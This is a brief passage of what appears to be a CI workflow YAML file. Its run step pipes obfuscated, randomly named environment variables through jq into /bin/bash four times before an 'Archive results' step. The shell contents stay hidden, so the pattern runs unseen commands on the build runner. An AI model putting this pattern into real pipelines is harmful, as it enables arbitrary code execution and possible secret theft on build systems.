        run: |
          printf '%s' "$fcfn15" | jq -r .nts95600 | /bin/bash
          echo $ox20941 | jq -r .fqzip77 | /bin/bash
          printf '%s' "$eky64791" | jq -r .ntc532 | /bin/bash
          echo $btpr276 | jq -r .eouv16 | /bin/bash

      - name: Archive results
